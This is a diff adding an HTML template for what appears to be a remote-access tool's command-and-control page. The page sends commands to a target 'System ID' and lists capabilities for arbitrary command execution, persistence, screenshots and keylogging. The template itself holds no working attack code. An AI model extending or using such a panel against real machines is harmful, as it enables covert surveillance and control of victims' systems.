@@ -1,0 +1,44 @@
+﻿<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="utf-8">
+    <title>GGFF15 Dashboard and Searchbar</title>
+    <link rel="stylesheet" href="../static/css/site.css"/>
+</head>
+<body>
+
+<img src="../static/img/ggff15logo.png" alt="Logo" class="avatar">
+
+
+<div class="topnav">
+    <a href="dashboard.html">Dashboard</a>
+    <a class=active href="#sendcommands">Send Commands</a>
+    <a href="recievedcommands.html">Received Commands</a>
+    <a href="login.html">Logout</a>
+</div>
+<form id="stuff" method="post" name="stuff">
+
+    <div class="sendcommands" div align="left">
+        <input type="text" id="idNumber" placeholder="System ID" name="idNumber" />
+
+        <input type="text" id="command" placeholder="Command to send" name="command" />
+
+        <button type="submit" id="submit" onclick="check(this.form)">Submit</button>
+
+    </div>
+    <h3><b>Available Commands</b></h3>
+    <div class="list-type4">
+        <ol>
+            <li><a href="#">cmd "Enter command here"</a></li>
+            <li><a href="#">persistence</a></li>
+            <li><a href="#">screenshot</a></li>
+            <li><a href="#">keylogger</a></li>
+        </ol>
+    </div>
+
+    {{ commandStatus }}
+
+</form>
+
+</body>
+</html>
